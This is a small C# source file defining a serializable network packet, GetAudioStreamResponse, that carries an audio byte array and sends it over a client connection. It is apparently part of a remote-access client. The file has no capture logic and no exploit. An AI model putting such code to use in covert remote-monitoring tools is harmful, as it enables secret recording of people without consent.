using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets {

    [Serializable]
    public class GetAudioStreamResponse : IPacket {

        public byte[] AudioStream { get; set; }

        public GetAudioStreamResponse() {
            
        }

        public GetAudioStreamResponse(byte[] audioStream) {
            AudioStream = audioStream;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
